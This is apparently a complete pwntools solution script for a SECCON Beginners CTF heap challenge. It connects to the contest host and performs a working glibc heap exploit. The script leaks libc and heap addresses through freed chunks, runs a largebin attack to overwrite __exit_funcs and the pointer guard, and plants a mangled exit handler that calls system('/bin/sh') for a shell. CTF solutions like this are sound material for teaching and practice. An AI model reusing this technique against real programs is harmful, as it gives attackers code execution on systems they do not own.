from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './bin/chall'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    # p = remote('localhost', 7777)
    p = remote('monkey.quals.beginners.seccon.jp', 9999)
    libc = ELF('./bin/libc.so.6')
    one_gadget = [0xebcf8, 0xebcf5, 0xebcf1]
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def create(i, size=1):
    sendlineafter(p, b'> ', b'1')
    sendlineafter(p, b'index: ', str(i).encode())
    sendlineafter(p, b'size: ', str(size).encode())

def write(i, data):
    sendlineafter(p, b'> ', b'2')
    sendlineafter(p, b'index: ', str(i).encode())
    sendlineafter(p, b'data: ', data)

def read(i):
    sendlineafter(p, b'> ', b'3')
    sendlineafter(p, b'index: ', str(i).encode())
    p.recvuntil(b'papyrus: ')
    ret = p.recvuntil(b'>')[:-1]
    sendline(p, b'4')
    sendlineafter(p, b'index: ', b'100')
    return ret

def burn(i):
    sendlineafter(p, b'> ', b'4')
    sendlineafter(p, b'index: ', str(i).encode())

# exit_funcs = 0x1ec718
# ptr_guard = 0x1f3570
exit_funcs = 0x219838
ptr_guard = -0x2890

# leak
create(0)
create(1)
create(2)
create(3)
burn(0)
burn(2)
# libc.address = u64(read(0).ljust(8, b'\0')) - 0x1ecbe0
libc.address = u64(read(0).ljust(8, b'\0')) - 0x219ce0
log.info('libc: ' + hex(libc.address))
heap = u64(read(2).ljust(8, b'\0'))
log.info('heap: ' + hex(heap))
burn(1)
burn(3)

# largebin attack
create(0, 0x528)
create(1)
create(2, 0x518)
create(3)
create(1, 0x508)
create(3)

# Overwrite __exit_funcs 
burn(0)
create(3, 0x538)
write(0, p64(0)*3+p64(libc.address+exit_funcs-0x20))
burn(2)
create(3, 0x538)

# Overwrite __pointer_chk_guard
write(0, p64(0)*3+p64(libc.address+ptr_guard-0x20))
burn(1)
create(3, 0x538)

# fake struct exit_function
fn = (heap+0x1470)^(libc.symbols['system'])
fn = ((fn<<17)&((1<<64)-1)) | (fn>>(64-17))
write(2, p64(4)+p64(fn)+p64(next(libc.search(b'/bin/sh')))+p64(0))

sendlineafter(p, b'> ', b'5')
p.interactive()
